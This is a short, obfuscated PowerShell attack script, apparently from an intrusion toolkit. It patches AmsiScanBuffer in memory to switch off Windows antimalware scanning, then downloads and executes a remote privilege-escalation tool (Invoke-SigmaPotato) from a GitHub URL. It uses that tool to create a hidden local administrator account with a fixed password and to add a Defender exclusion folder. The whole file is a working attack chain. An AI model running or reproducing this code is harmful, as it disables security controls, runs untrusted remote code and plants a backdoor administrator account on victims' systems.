#Rasta-mouses Amsi-Scan-Buffer patch \n
$D3FIHAj6bkLJW = @"
using System;
using System.Runtime.InteropServices;
public class D3FIHAj6bkLJW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr QJgcpM4ki, string PQlJa7rB4DWwBKn4J);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr SmD3S3Yfrjs2mSHWrFO, UIntPtr JIs6P27jXvYlZ, uint Lkmiei9jCAnZPG85h_p, out uint I5SM_);
}
"@

Add-Type $D3FIHAj6bkLJW

$sDs5LNZd4FUl4w3flj87 = [D3FIHAj6bkLJW]::LoadLibrary("$(('ámsî'+'.dll').NorMalIZe([ChAr]([ByTE]0x46)+[char]([BYTe]0x6f)+[ChAr]([bYtE]0x72)+[CHAR](109*79/79)+[ChAr]([ByTe]0x44)) -replace [cHar](92*54/54)+[chaR]([bYTE]0x70)+[cHAr](123+32-32)+[chAr](77)+[cHaR](67+43)+[cHaR](125*75/75))")
$ddMoTBS8hf = [D3FIHAj6bkLJW]::GetProcAddress($sDs5LNZd4FUl4w3flj87, "$([cHAR]([Byte]0x41)+[cHar](28+81)+[ChAr]([BYte]0x73)+[CHAR]([byTE]0x69)+[char](83)+[CHAr](22+77)+[ChAr](97*38/38)+[cHAR](110+13-13)+[Char]([byTE]0x42)+[CHaR]([BYTE]0x75)+[cHAR]([ByTE]0x66)+[chAr](102*96/96)+[CHaR]([bYte]0x65)+[CHar](114))")
$p = 0
[D3FIHAj6bkLJW]::VirtualProtect($ddMoTBS8hf, [uint32]5, 0x40, [ref]$p)
$Sw8WfDcwJWFWK = "0xB8"
$kz3UU0S37ZhGTkdGUk = "0x57"
$HxCrB9O_FTx5 = "0x00"
$DuY1xHU = "0x07"
$beu_ryZA = "0x80"
$C8K9O = "0xC3"
$Yf8bmEtVS8f2WPT = [Byte[]] ($Sw8WfDcwJWFWK,$kz3UU0S37ZhGTkdGUk,$HxCrB9O_FTx5,$DuY1xHU,+$beu_ryZA,+$C8K9O)
[System.Runtime.InteropServices.Marshal]::Copy($Yf8bmEtVS8f2WPT, 0, $ddMoTBS8hf, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"


